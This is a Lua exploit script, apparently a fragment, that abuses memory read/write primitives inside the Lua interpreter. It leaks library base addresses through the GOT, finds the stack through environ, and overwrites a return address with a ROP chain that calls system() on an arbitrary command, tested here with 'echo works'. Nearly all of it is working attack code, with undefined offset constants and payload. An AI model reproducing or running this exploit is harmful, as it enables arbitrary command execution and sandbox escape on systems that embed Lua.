-- find likely match for return address on stack, based on masking last 12 bits
-- (4k block)
local function search_backwards_mask(start, mask)
    for addr = start, start - 0x2000, -PTRSIZE do
        local data = read(addr, PTRSIZE)
        if (deubPTRSIZE(data) & 0xfff) == mask then return addr end
    end
end

-- craft ROP chain, scan stack for return from lua_pcallk in main, write chain there
local function ropper(command)
    -- populate GOT
    _ = string.lower('A')

    local liblua_base = addrOf(string.lower) - STRING_LOWER_OFF
    local tolower_got_plt_addr = liblua_base + TOLOWER_GOT_PLT_OFF
    local pop_rdi_ret = liblua_base + POP_RDI_RET_OFF
    local ret = pop_rdi_ret + 1

    local libc_base = deubPTRSIZE(read(tolower_got_plt_addr, PTRSIZE)) - TOLOWER_OFF
    -- actual environ lives in linker?
    local environ_got = libc_base + ENVIRON_GOT_OFF
    local system_addr = libc_base + SYSTEM_OFF
    local exit = libc_base + EXIT_OFF

    local environ_x = read(environ_got, PTRSIZE)
    local stack_addr = deubPTRSIZE(read(deubPTRSIZE(environ_x), PTRSIZE))
    stack_addr = stack_addr - (stack_addr % PTRSIZE)

    local write_addr = search_backwards_mask(stack_addr, OVERWRITTEN_RET_OFF & 0xfff)
    if write_addr == nil then error("nil") end

    command = command .. '\x00'
    local command_ptr = dataPtr(command)

    local payload = PAYLOAD

    -- works without this, ~90% of the time, but crashes sometimes
    collectgarbage('stop')
    write(write_addr, payload)
end

local function main()
    ropper("echo works")
end

main()
